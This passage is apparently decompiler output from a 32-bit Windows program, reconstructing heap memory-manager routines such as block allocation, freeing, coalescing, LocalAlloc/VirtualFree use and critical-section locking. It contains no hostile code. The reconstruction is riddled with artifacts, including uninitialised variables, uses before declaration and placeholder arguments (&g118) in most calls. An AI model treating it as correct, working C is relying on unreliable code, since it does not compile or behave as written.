                if (v2 <= *v5) {
                    // break (via goto) -> 0x4015e0
                    goto lab_0x4015e0;
                }
                // 0x40160c
                v3 = *(int32_t *)v4;
            }
        }
        // 0x401612
        result = function_401312();
    }
    // 0x401641
    return result;
  lab_0x4015e0:
    // 0x4015e0
    result = function_4014a6();
    if (v2 == 0) {
        // 0x401641
        return result;
    }
    int32_t * v8 = (int32_t *)(v6 + 4); // 0x4015f1
    int32_t * v9 = (int32_t *)(v4 + 8); // 0x4015f4
    *v9 = *v9 + *v8;
    int32_t v10 = *v8; // 0x4015f7
    int32_t v11 = *v5 - v10; // 0x4015fa
    *v5 = v11;
    result = v10;
    if (v11 == 0) {
        // 0x401603
        result = function_4011f6();
    }
  lab_0x401641:
    // 0x401641
    return result;
}

// Address range: 0x40164a - 0x40176d
int32_t function_40164a(int32_t a1, int32_t a2) {
    // 0x40164a
    int32_t v1; // 0x40164a
    int32_t v2 = v1 + 0x3fff & -0x4000; // 0x401663
    int32_t v3; // 0x40164a
    int32_t v4; // 0x40164a
    int32_t v5; // 0x40164a
    int32_t * v6; // 0x40164a
    while (true) {
        int32_t v7 = &g67; // 0x401672
        if (g67 != (int32_t)&g67) {
            int32_t v8 = g67;
            v7 = v8;
            while (v5 != *(int32_t *)(v8 + 8)) {
                int32_t v9 = *(int32_t *)v8;
                int32_t v10 = v9; // 0x401672
                v7 = &g67;
                if (v9 == (int32_t)&g67) {
                    // break -> 0x401679
                    break;
                }
                v8 = v10;
                v7 = v8;
            }
        }
        // 0x401679
        v3 = v7;
        v6 = (int32_t *)(v3 + 8);
        int32_t v11; // 0x40164a
        int32_t v12; // 0x40164a
        if (v5 != *v6) {
            // 0x4016d5
            function_401376();
            if (v12 == 0) {
                // break -> 0x40171d
                break;
            }
            // 0x4016e9
            function_40120e();
            if (v11 == 0) {
                // 0x401703
                function_4013ee();
                *(int32_t *)v4 = 0;
                return result;
            }
        } else {
            // 0x40167e
            if (v2 <= *(int32_t *)(v3 + 12)) {
                // break -> 0x40171d
                break;
            }
            // 0x401687
            function_401376();
            if (v12 == 0) {
                // 0x4016d5
                function_401376();
                goto lab_0x40171d;
            }
            // 0x4016a2
            function_40120e();
            if (v11 == 0) {
                // 0x4016b8
                function_4013ee();
                *(int32_t *)v4 = 0;
                return result;
            }
        }
    }
    goto lab_0x40171d;
  lab_0x40171d:;
    // 0x40171d
    int32_t result; // 0x40164a
    if (v5 != *v6) {
        // 0x40175e
        *(int32_t *)v4 = 0;
        // 0x401765
        return result;
    }
    int32_t * v13 = (int32_t *)(v3 + 12); // 0x401724
    if (v2 > *v13) {
        // 0x40175e
        *(int32_t *)v4 = 0;
        // 0x401765
        return result;
    }
    // 0x401729
    function_4014a6();
    if (v4 == 0) {
        // 0x401765
        return 0;
    }
    int32_t * v14 = (int32_t *)(v4 + 4); // 0x401740
    *v6 = *v6 + *v14;
    int32_t v15 = *v14; // 0x401749
    int32_t v16 = *v13 - v15; // 0x40174c
    *v13 = v16;
    result = v15;
    if (v16 == 0) {
        // 0x401755
        result = function_4011f6();
    }
  lab_0x401765:
    // 0x401765
    return result;
}

// Address range: 0x40176e - 0x4017fa
int32_t function_40176e(void) {
    // 0x40176e
    int32_t v1; // 0x40176e
    int32_t v2; // 0x40176e
    if ((uint32_t)(v2 + 0x3fff & -0x4000) >= (uint32_t)(v2 + v1 & -0x4000)) {
        // 0x4017ef
        int32_t v3; // 0x40176e
        *(int32_t *)v3 = 0;
        // 0x4017f3
        return 0;
    }
    // 0x401794
    int32_t v4; // 0x40176e
    int32_t v5; // 0x40176e
    int32_t v6; // 0x40176e
    function_40153a(v6, v5, v4);
    int32_t result = function_40120e(); // 0x4017b7
    int32_t v7; // 0x40176e
    if (v7 == 0) {
        // 0x4017f3
        return result;
    }
    // 0x4017d8
    function_4013ee();
    int32_t v8; // 0x40176e
    if (v8 != 0) {
        // 0x4017df
        result = function_40127e();
    }
    // 0x4017f3
    return result;
}

// Address range: 0x4017fa - 0x4018b0
int32_t function_4017fa(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x401805
    __writefsdword(0, (int32_t)&v1);
    struct _RTL_CRITICAL_SECTION * v2 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-20, 0x40180b
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
    struct _RTL_CRITICAL_SECTION ** v3 = &v2; // 0x40181c
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-24, 0x40181e
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    function_4011be();
    function_4011be();
    function_4011be();
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x401846
    *v6 = 4088;
    int32_t * v7 = (int32_t *)(v5 - 8); // 0x40184b
    *v7 = 0;
    int32_t * memoryHandle = LocalAlloc((int32_t)&g118, (int32_t)&g118); // 0x40184d
    g73 = (int32_t)memoryHandle;
    if (memoryHandle != NULL) {
        // 0x401865
        *memoryHandle = 0;
        int32_t v8 = 3; // 0x401871
        v8++;
        *(int32_t *)(g73 - 12 + 4 * v8) = 0;
        while (v8 != 1024) {
            // 0x401865
            v8++;
            *(int32_t *)(g73 - 12 + 4 * v8) = 0;
        }
        // 0x401879
        g69 = &g68;
        g68 = &g68;
        g70 = &g68;
        g61 = 1;
    }
    // 0x40188f
    __writefsdword(0, *v7);
    *(int32_t *)v3 = 0x4018b7;
    int32_t result = 0; // 0x4018a3
    if (g51 != 0) {
        // 0x4018a5
        *v6 = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result = &g118;
    }
    // 0x4018af
    return result;
}

// Address range: 0x4018b0 - 0x4018b5
int32_t function_4018b0(void) {
    // 0x4018b0
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4018b5 - 0x4018b7
int32_t function_4018b5(void) {
    // 0x4018b5
    int32_t result; // 0x4018b5
    return result;
}

// Address range: 0x4018b7 - 0x4018be
int32_t function_4018b7(int32_t a1) {
    // 0x4018b7
    int32_t v1; // 0x4018b7
    return v1 & -256 | (int32_t)(unsigned char)g61;
}

// Address range: 0x4018be - 0x40199e
int32_t function_4018be(void) {
    // 0x4018be
    if (g61 == 0) {
        // 0x40199b
        int32_t result; // 0x4018be
        return result;
    }
    int32_t v1 = __readfsdword(0); // bp-20, 0x4018d7
    int32_t v2 = &v1; // 0x4018d7
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x4018e4
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v4 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-24, 0x4018e6
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v3 = (int32_t)&v4;
    }
    // 0x4018f0
    g61 = 0;
    int32_t v5 = v3 - 4; // 0x4018fc
    *(int32_t *)v5 = g73;
    LocalFree(&g118);
    g73 = 0;
    int32_t v6 = g66; // 0x401929
    int32_t v7 = v5; // 0x401929
    int32_t v8 = v5; // 0x401929
    if (g66 != (int32_t)&g66) {
        *(int32_t *)(v7 - 4) = 0x8000;
        *(int32_t *)(v7 - 8) = 0;
        v7 -= 12;
        *(int32_t *)v7 = *(int32_t *)(v6 + 8);
        VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        v6 = *(int32_t *)v6;
        v8 = v7;
        while (v6 != (int32_t)&g66) {
            // 0x401911
            *(int32_t *)(v7 - 4) = 0x8000;
            *(int32_t *)(v7 - 8) = 0;
            v7 -= 12;
            *(int32_t *)v7 = *(int32_t *)(v6 + 8);
            VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
            v6 = *(int32_t *)v6;
            v8 = v7;
        }
    }
    // 0x40192b
    function_4011be();
    function_4011be();
    function_4011be();
    int32_t v9 = g64; // 0x401950
    int32_t v10 = v8; // 0x401950
    int32_t * v11; // 0x4018be
    int32_t v12; // 0x4018be
    if (g64 == 0) {
        // 0x40192b
        v11 = (int32_t *)v8;
        v12 = v8;
    } else {
        g64 = *(int32_t *)v9;
        v10 -= 4;
        int32_t * v13 = (int32_t *)v10;
        *v13 = v9;
        LocalFree(&g118);
        v9 = g64;
        v11 = v13;
        v12 = v10;
        while (v9 != 0) {
            // 0x401952
            g64 = *(int32_t *)v9;
            v10 -= 4;
            v13 = (int32_t *)v10;
            *v13 = v9;
            LocalFree(&g118);
            v9 = g64;
            v11 = v13;
            v12 = v10;
        }
    }
    // 0x401969
    __writefsdword(0, *v11);
    int32_t v14 = v12 + 8; // 0x401971
    *(int32_t *)v14 = 0x40199b;
    int32_t v15 = v14; // 0x40197d
    if (g51 != 0) {
        // 0x40197f
        v15 = v12 + 4;
        *(int32_t *)v15 = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
    }
    // 0x401989
    *(int32_t *)(v15 - 4) = (int32_t)&g63;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
    return &g118;
}

// Address range: 0x40199e - 0x4019ff
int32_t function_40199e(void) {
    // 0x40199e
    int32_t result2; // 0x40199e
    int32_t * v1 = (int32_t *)(result2 + 4);
    if (result2 == g70) {
        // 0x4019a7
        g70 = *v1;
    }
    int32_t v2 = *v1; // 0x4019b0
    int32_t v3 = *(int32_t *)(result2 + 8); // 0x4019b3
    if (v3 > 0x1000) {
        // 0x4019f6
        *v1 = v2;
        // 0x4019fd
        int32_t result; // 0x40199e
        return result;
    }
    int32_t * v4 = (int32_t *)(g73 + ((v3 >= 0 ? v3 : v3 + 3) - 12 & -4));
    if (result2 == v2) {
        // 0x4019c2
        *v4 = 0;
        // 0x4019fd
        return g73;
    }
    // 0x4019d9
    *v4 = v2;
    *v1 = v2;
    return result2;
}

// Address range: 0x401a02 - 0x401a31
int32_t function_401a02(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x401a02
    if (g74 != (int32_t)&g74) {
        uint32_t v1 = *(int32_t *)(g74 + 8); // 0x401a0a
        uint32_t v2; // 0x401a02
        if (v2 >= v1) {
            // 0x401a11
            if (v2 < *(int32_t *)(g74 + 12) + v1) {
                // 0x401a2e
                return g74;
            }
        }
        int32_t v3 = *(int32_t *)g74;
        while (v3 != (int32_t)&g74) {
            int32_t v4 = v3;
            v1 = *(int32_t *)(v4 + 8);
            if (v2 >= v1) {
                int32_t result = v4; // 0x401a16
                if (v2 < *(int32_t *)(v4 + 12) + v1) {
                    // 0x401a2e
                    return result;
                }
            }
            // 0x401a18
            v3 = *(int32_t *)v4;
        }
    }
    // 0x401a22
    g62 = 3;
    // 0x401a2e
    return 0;
}

// Address range: 0x401a32 - 0x401a62
int32_t function_401a32(void) {
    // 0x401a32
    uint32_t v1; // 0x401a32
    int32_t result; // 0x401a32
    int32_t v2 = v1 - 4 + result; // 0x401a38
    if (v1 >= 16) {
        // 0x401a40
        *(int32_t *)v2 = -0x7ffffff9;
        return function_401c06();
    }
    if (v1 >= 4) {
        int32_t v3 = v1 | -0x7ffffffe; // 0x401a56
        *(int32_t *)result = v3;
        *(int32_t *)v2 = v3;
    }
    // 0x401a60
    return result;
}

// Address range: 0x401a62 - 0x401a84
int32_t function_401a62(void) {
    // 0x401a62
    g57++;
    int32_t v1; // 0x401a62
    g58 += (*(int32_t *)(v1 - 4) & 0x7ffffffc) - 4;
    return function_402076();
}

// Address range: 0x401a86 - 0x401aae
int32_t function_401a86(void) {
    // 0x401a86
    uint32_t v1; // 0x401a86
    int32_t v2; // 0x401a86
    if (v1 >= 12) {
        // 0x401a8b
        *(int32_t *)v2 = v1 | 2;
        return function_401a62();
    }
    if (v1 >= 4) {
        // 0x401a9e
        *(int32_t *)v2 = v1 | -0x7ffffffe;
    }
    int32_t result = v2 + v1; // 0x401aa8
    int32_t * v3 = (int32_t *)result; // 0x401aaa
    *v3 = *v3 & -2;
    return result;
}

// Address range: 0x401aae - 0x401b1b
int32_t function_401aae(void) {
    // 0x401aae
    int32_t v1; // 0x401aae
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x401ab5
    if ((v2 & -0x7ffffffe) != -0x7ffffffe) {
        // 0x401ac7
        g62 = 4;
    }
    int32_t result = v2 & 0x7ffffffc; // 0x401ad3
    int32_t v3 = v1 - result; // 0x401ad9
    if ((*(int32_t *)v3 ^ v2) >= 2) {
        // 0x401ae7
        g62 = 5;
    }
    // 0x401af1
    if ((*(char *)v3 & 1) == 0) {
        // 0x401b16
        return result;
    }
    int32_t v4 = *(int32_t *)(v3 - 4); // 0x401afb
    if (v4 != *(int32_t *)(v3 + 8 - v4)) {
        // 0x401b05
        g62 = 6;
    }
    // 0x401b0f
    function_40199e();
    // 0x401b16
    return v4 + result;
}

// Address range: 0x401b1e - 0x401b56
int32_t function_401b1e(void) {
    int32_t v1 = 0; // 0x401b2c
    int32_t v2; // 0x401b1e
    int32_t v3; // 0x401b1e
    uint32_t v4; // 0x401b1e
    if (v4 <= 0xffffffff) {
        // 0x401b2e
        v1 = v4 & 0x7ffffffc;
        int32_t v5 = v1 + v4; // 0x401b35
        v2 = *(int32_t *)v5;
        v3 = v5;
    }
    int32_t result = v1; // 0x401b3b
    if ((v2 & 2) == 0) {
        // 0x401b3d
        function_40199e();
        int32_t v6 = *(int32_t *)(v3 + 8); // 0x401b46
        int32_t * v7 = (int32_t *)(v6 + v3); // 0x401b4d
        *v7 = *v7 & -2;
        result = v6 + v1;
    }
    // 0x401b50
    return result;
}

// Address range: 0x401b56 - 0x401c03
int32_t function_401b56(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401b56
    int32_t v1; // 0x401b56
    int32_t v2; // 0x401b56
    int32_t v3; // 0x401b56
    int32_t v4; // 0x401b56
    int32_t v5 = function_401a02(v4, v2, v1, v3); // 0x401b67
    if (v5 == 0) {
        // 0x401bf8
        return 0;
    }
    int32_t v6 = function_40176e(); // 0x401bc2
    int32_t v7; // 0x401b56
    if (v7 == 0) {
        // 0x401bf8
        return v6 & -256;
    }
    // 0x401bc4
    function_401a32();
    int32_t v8; // 0x401b56
    if (v7 + v8 < *(int32_t *)(v5 + 12) + *(int32_t *)(v5 + 8)) {
        // 0x401bdf
        function_401a86();
    }
    // 0x401bf8
    return function_40127e() & -256 | 1;
}

// Address range: 0x401c06 - 0x401c8b
int32_t function_401c06(void) {
    // 0x401c06
    uint32_t v1; // 0x401c06
    int32_t v2; // 0x401c06
    if (v1 > 0x1000) {
        if (v1 >= 0x3c00) {
            // 0x401c63
            int32_t v3; // 0x401c06
            int32_t v4; // 0x401c06
            int32_t v5; // 0x401c06
            int32_t result = function_401b56(v5, v4, v3); // 0x401c67
            if ((char)result != 0) {
                // 0x401c87
                return result;
            }
        }
        // 0x401c70
        *(int32_t *)(v2 + 4) = g70;
        *(int32_t *)v2 = *(int32_t *)g70;
        // 0x401c87
        return g70;
    }
    int32_t v6 = (int32_t)v1 >= 0 ? v1 : v1 + 3;
    int32_t v7 = *(int32_t *)(g73 + (v6 - 12 & -4)); // 0x401c35
    int32_t result2; // 0x401c06
    if (v7 != 0) {
        // 0x401c4d
        *(int32_t *)(v2 + 4) = v7;
        *(int32_t *)v2 = *(int32_t *)v7;
        result2 = v7;
    } else {
        // 0x401c3d
        result2 = g73;
    }
    // 0x401c87
    return result2;
}

// Address range: 0x401c8e - 0x401cd8
int32_t function_401c8e(void) {
    // 0x401c8e
    int32_t result; // 0x401c8e
    if (g71 < 1) {
        // 0x401cd7
        return result;
    }
    if (g71 > 11) {
        // 0x401cac
        *(int32_t *)g72 = g71 | 2;
        function_401a62();
        g72 = 0;
        g71 = 0;
        result = 0;
    } else {
        // 0x401ca0
        g62 = 7;
    }
    // 0x401cd7
    return result;
}

// Address range: 0x401cda - 0x401d63
int32_t function_401cda(void) {
    // 0x401cda
    bool v1; // 0x401cda
    int32_t v2 = v1 ? -4 : 4; // 0x401ce5
    int32_t v3; // 0x401cda
    int32_t v4 = *(int32_t *)(v2 + v3); // 0x401ce6
    int32_t v5; // bp-28, 0x401cda
    *(int32_t *)(v2 + (int32_t)&v5) = v4;
    function_401c8e();
    function_40120e();
    uint32_t v6; // 0x401cda
    if (v6 == 0) {
        // 0x401d5c
        return 0;
    }
    int32_t v7 = v5; // 0x401d0e
    int32_t v8; // 0x401cda
    if (v6 < v5) {
        int32_t v9 = function_401aae(); // 0x401d10
        v7 = v5 - v9;
        v5 = v7;
        int32_t v10; // 0x401cda
        v8 = v9 + v10;
    }
    int32_t v11 = v8 + v7;
    int32_t v12; // 0x401cda
    uint32_t v13 = v6 + v12; // 0x401d21
    int32_t v14 = v11; // 0x401d27
    int32_t v15 = v7; // 0x401d27
    int32_t v16 = v8; // 0x401d27
    if (v11 < v13) {
        // 0x401d29
        v16 = function_401b1e() + v8;
        v15 = v5;
        v14 = v15 + v16;
    }
    // 0x401d31
    v5 = v15;
    int32_t v17 = v16; // 0x401d38
    if (v13 == v14) {
        // 0x401d3a
        function_401a32();
        v17 = v16 - 4;
    }
    // 0x401d4b
    g72 = v5;
    g71 = v17;
    // 0x401d5c
    return v17 & -256 | 1;
}

// Address range: 0x401d66 - 0x401d91
int32_t function_401d66(void) {
    // 0x401d66
    int32_t v1; // 0x401d66
    function_4015ba(v1);
    int32_t v2; // 0x401d66
    if (v2 == 0) {
        // 0x401d8d
        return 0;
    }
    int32_t v3 = function_401cda(); // 0x401d7e
    int32_t result = 0; // 0x401d85
    if ((char)v3 != 0) {
        // 0x401d8b
        result = v3 & -256 | 1;
    }
    // 0x401d8d
    return result;
}

// Address range: 0x401d92 - 0x401dc3
int32_t function_401d92(void) {
    // 0x401d92
    int32_t v1; // 0x401d92
    int32_t v2; // 0x401d92
    function_40164a(v2, v1);
    int32_t v3; // 0x401d92
    if (v3 == 0) {
        // 0x401dbe
        return 0;
    }
    int32_t v4 = function_401cda(); // 0x401daf
    int32_t result = 0; // 0x401db6
    if ((char)v4 != 0) {
        // 0x401dbc
        result = v4 & -256 | 1;
    }
    // 0x401dbe
    return result;
}

// Address range: 0x401dc6 - 0x401df2
int32_t function_401dc6(void) {
    // 0x401dc6
    int32_t v1; // 0x401dc6
    int32_t v2 = v1 >= 0 ? v1 : v1 + 3;
    if (v2 > 0x1003) {
        // 0x401def
        return 0;
    }
    int32_t v3 = v2 / 4;
    int32_t result = *(int32_t *)(g73 - 12 + 4 * v3); // 0x401ddf
    while (result == 0) {
        // 0x401dd9
        if (v3 == 1024) {
            // break -> 0x401def
            break;
        }
        // 0x401de7
        v3++;
        result = *(int32_t *)(g73 - 12 + 4 * v3);
    }
    // 0x401def
    return result;
}

// Address range: 0x401df2 - 0x401ee6
int32_t function_401df2(void) {
    int32_t v1 = g69 + 8;
    int32_t v2 = v1; // 0x401e0b
    int32_t v3 = g69; // 0x401e0b
    // 0x401df2
    int32_t result; // 0x401df2
    uint32_t v4; // 0x401df2
    while (v4 > *(int32_t *)v1) {
        int32_t v5 = g70; // 0x401e11
        int32_t v6 = v5 + 8;
        uint32_t v7 = *(int32_t *)v6; // 0x401e13
        v2 = v6;
        v3 = v5;
        if (v4 <= v7) {
            // break -> 0x401e95
            break;
        }
        int32_t v8 = *(int32_t *)(v5 + 4); // 0x401e1d
        int32_t v9 = v8 + 8;
        int32_t v10 = v8; // 0x401e23
        while (v4 > *(int32_t *)v9) {
            // 0x401e1d
            v8 = *(int32_t *)(v10 + 4);
            v9 = v8 + 8;
            v10 = v8;
        }
        // 0x401e25
        *(int32_t *)(g70 + 8) = v7;
        if (v8 != g70) {
            // 0x401e2e
            g70 = v8;
            v2 = v9;
            v3 = v8;
            goto lab_0x401e95;
        }
        if (v4 <= 0x1000) {
            int32_t v11 = function_401dc6(); // 0x401e3c
            if (v11 != 0) {
                // 0x401e3a
                v2 = v11 + 8;
                v3 = v11;
                goto lab_0x401e95;
            }
        }
        // 0x401e47
        if ((char)function_401d66() == 0) {
            // 0x401ee1
            return 0;
        }
        // 0x401e59
        if (g71 >= v4) {
            int32_t v12 = g71 - v4; // 0x401e5e
            int32_t v13 = v12 > 11 ? v4 : g71;
            g71 = v12 > 11 ? v12 : 0;
            int32_t v14 = g72;
            g72 = v14 + v13;
            *(int32_t *)v14 = v13 | 2;
            g57++;
            g58 += v13 - 4;
            result = v14 + 4;
            return result;
        }
        v1 = g69 + 8;
        v2 = v1;
        v3 = g69;
    }
    goto lab_0x401e95;
  lab_0x401e95:
    // 0x401e95
    function_40199e();
    int32_t v15 = *(int32_t *)v2; // 0x401e9c
    int32_t v16; // 0x401df2
    if (v15 - v4 < 12) {
        // 0x401eb4
        if (v3 == g70) {
            // 0x401eba
            g70 = *(int32_t *)(v3 + 4);
        }
        int32_t * v17 = (int32_t *)(v15 + v3); // 0x401ec3
        *v17 = *v17 & -2;
        v16 = v15;
    } else {
        // 0x401ea8
        function_401c06();
    }
    // 0x401ec6
    *(int32_t *)v3 = v16 | 2;
    g57++;
    g58 += v16 - 4;
    result = v3 + 4;
  lab_0x401ee1:
    // 0x401ee1
    return result;
}

// Address range: 0x401ee6 - 0x402062
int32_t function_401ee6(void) {
    // 0x401ee6
    uint32_t v1; // 0x401ee6
    int32_t result; // 0x401f10
    if (g61 != 0) {
        if (v1 >= 0x7ffffff9) {
            // 0x401f0b
            result = function_402069(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            return result;
        }
    } else {
        // 0x401efa
        int32_t v2; // 0x401ee6
        if (v1 < 0x7ffffff9 != (char)function_4017fa(v2) != 0) {
            // 0x401f0b
            result = function_402069(0, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            return result;
        }
    }
    int32_t v3 = __readfsdword(0); // bp-36, 0x401f1d
    int32_t v4 = &v3; // 0x401f1d
    __writefsdword(0, v4);
    int32_t v5 = v4; // 0x401f2a
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v6 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-40, 0x401f2c
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v5 = (int32_t)&v6;
    }
    int32_t v7 = v1 + 7 & -4; // 0x401f39
    uint32_t v8 = v7 > 12 ? v7 : 12;
    if (v8 <= 0x1000) {
        int32_t v9 = v8 - 12;
        int32_t v10 = *(int32_t *)(g73 + v9); // 0x401f64
        if (v10 != 0) {
            int32_t * v11 = (int32_t *)(v10 + v8); // 0x401f72
            *v11 = *v11 & -2;
            int32_t v12 = v10 + 4; // 0x401f75
            int32_t v13 = *(int32_t *)v12; // 0x401f75
            int32_t * v14 = (int32_t *)(g73 + v9);
            int32_t * v15; // 0x401ee6
            if (v10 != v13) {
                // 0x401f9f
                *v14 = v13;
                int32_t * v16 = (int32_t *)v10;
                int32_t v17 = *v16; // 0x401fac
                *(int32_t *)(v17 + 4) = v13;
                *(int32_t *)v13 = v17;
                v15 = v16;
            } else {
                // 0x401f85
                *v14 = 0;
                v15 = (int32_t *)v10;
            }
            // 0x401fbc
            *v15 = *(int32_t *)(v10 + 8) | 2;
            g57++;
            g58 += v8 - 4;
            function_402e42(v12, (int32_t)&g118);
            int32_t result2 = function_402069((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x401fe0
            return result2;
        }
    }
    // 0x401fe5
    if (g71 < v8) {
        // 0x402037
        function_401df2();
        __writefsdword(0, *(int32_t *)v5);
        *(int32_t *)(v5 + 8) = 0x402069;
        int32_t result3 = 0; // 0x402055
        if (g51 != 0) {
            // 0x402057
            *(int32_t *)(v5 + 4) = (int32_t)&g63;
            LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
            result3 = &g118;
        }
        // 0x402061
        return result3;
    }
    int32_t v18 = g71 - v8; // 0x401fed
    int32_t v19 = v18 > 11 ? v8 : g71;
    g71 = v18 > 11 ? v18 : 0;
    int32_t v20 = g72;
    g72 = v20 + v19;
    *(int32_t *)v20 = v19 | 2;
    g57++;
    g58 += v19 - 4;
    function_402e42(v20 + 4, (int32_t)&g118);
    int32_t result4 = function_402069((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402035
    return result4;
}

// Address range: 0x402062 - 0x402067
int32_t function_402062(void) {
    // 0x402062
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x402067 - 0x402069
int32_t function_402067(void) {
    // 0x402067
    int32_t result; // 0x402067
    return result;
}

// Address range: 0x402069 - 0x402073
int32_t function_402069(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x402069
    int32_t v1; // 0x402069
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x402076 - 0x402208
int32_t function_402076(void) {
    // 0x402076
    g62 = 0;
    if (g61 == 0) {
        // 0x40208f
        int32_t v1; // 0x402076
        if ((char)function_4017fa(v1) == 0) {
            // 0x402098
            g62 = 8;
            int32_t result = function_40220f(8, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x4020a9
            return result;
        }
    }
    int32_t v2 = __readfsdword(0); // bp-32, 0x4020b6
    int32_t v3 = &v2; // 0x4020b6
    __writefsdword(0, v3);
    int32_t v4 = v3; // 0x4020c3
    if (g51 != 0) {
        struct _RTL_CRITICAL_SECTION * v5 = (struct _RTL_CRITICAL_SECTION *)&g63; // bp-36, 0x4020c5
        EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g63);
        v4 = (int32_t)&v5;
    }
    // 0x4020cf
    int32_t v6; // 0x402076
    int32_t v7 = v6 - 4; // 0x4020d1
    int32_t v8 = *(int32_t *)v7; // 0x4020d4
    int32_t v9; // 0x402076
    int32_t v10; // 0x402076
    if ((v8 & 2) != 0) {
        // 0x4020ea
        g57--;
        int32_t v11 = v8 & 0x7ffffffc;
        g58 += 4 - v11;
        v9 = v11;
        v10 = v7;
        if ((v8 & 1) == 0) {
            goto lab_0x40214a;
        } else {
            int32_t v12 = *(int32_t *)(v6 - 8); // 0x40210a
            if (v12 > 11 == (v12 & -0x7ffffffd) == 0) {
                int32_t v13 = v7 - v12; // 0x40212b
                if (v12 == *(int32_t *)(v13 + 8)) {
                    // 0x402141
                    function_40199e();
                    v9 = v12 + v8 & 0x7ffffffc;
                    v10 = v13;
                    goto lab_0x40214a;
                } else {
                    // 0x402132
                    g62 = 10;
                    goto lab_0x4021df;
                }
            } else {
                // 0x40211a
                g62 = 10;
                goto lab_0x4021df;
            }
        }
    } else {
        // 0x4020db
        g62 = 9;
        goto lab_0x4021df;
    }
  lab_0x40214a:;
    int32_t v14 = v10 + v9; // 0x402152
    if (v14 == g72) {
        // 0x40215e
        g72 -= v9;
        int32_t v15 = g71 + v9; // 0x402164
        g71 = v15;
        if (v15 >= 0x3c01) {
            // 0x402176
            function_401c8e();
        }
        // 0x40217b
        function_402e42(0, (int32_t)&g118);
        int32_t result2 = function_40220f((int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402185
        return result2;
    }
    int32_t * v16 = (int32_t *)v14; // 0x40218a
    int32_t v17 = *v16; // 0x40218a
    if ((v17 & 2) == 0) {
        // 0x4021ad
        if (v17 == 0 | *(int32_t *)(v14 + 4) == 0) {
            // 0x4021c0
            g62 = 11;
            goto lab_0x4021df;
        } else {
            // 0x4021ba
            if (*(int32_t *)(v14 + 8) > 11) {
                // 0x4021cc
                function_40199e();
                // 0x4021d6
                function_401c06();
                goto lab_0x4021df;
            } else {
                // 0x4021c0
                g62 = 11;
                goto lab_0x4021df;
            }
        }
    } else {
        if ((v17 & 0x7ffffffc) == 0) {
            // 0x40219c
            g62 = 11;
            goto lab_0x4021df;
        } else {
            // 0x4021a8
            *v16 = v17 | 1;
            // 0x4021d6
            function_401c06();
            goto lab_0x4021df;
        }
    }
  lab_0x4021df:
    // 0x4021df
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x40220f;
    int32_t result3 = 0; // 0x4021fb
    if (g51 != 0) {
        // 0x4021fd
        *(int32_t *)(v4 + 4) = (int32_t)&g63;
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g118);
        result3 = &g118;
    }
    // 0x402207
    return result3;
}

// Address range: 0x402208 - 0x40220d
int32_t function_402208(void) {
    // 0x402208
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40220d - 0x40220f
int32_t function_40220d(void) {
    // 0x40220d
    int32_t result; // 0x40220d
    return result;
}

// Address range: 0x40220f - 0x402218
int32_t function_40220f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40220f
    int32_t v1; // 0x40220f
    return *(int32_t *)(v1 - 4);
}

// Address range: 0x40221a - 0x4023f4
int32_t function_40221a(void) {
    // 0x40221a
    int32_t v1; // 0x40221a
    int32_t v2 = v1 + 7 & -4; // 0x402226
    int32_t v3 = v2 > 12 ? v2 : 12;
    int32_t v4; // 0x40221a
    int32_t v5 = v4 - 4; // 0x402235
    int32_t * v6 = (int32_t *)v5; // 0x402238
    int32_t v7 = *v6 & 0x7ffffffc; // 0x40223b
    int32_t v8 = v7 + v5; // 0x402243
    if (v7 == v3) {
        // 0x4023ed
        return v8 & -256 | 1;
    }
    int32_t v9; // 0x40221a
    if (v7 > v3) {
        int32_t v10 = v7 - v3; // 0x40225c
        int32_t v11 = g72; // 0x402261
        if (v8 != v11) {
            int32_t v12 = v10; // 0x4022a6
            if ((*(char *)v8 & 2) == 0) {
                // 0x4022a8
                function_40199e();
                v12 = *(int32_t *)(v8 + 8) + v10;
            }
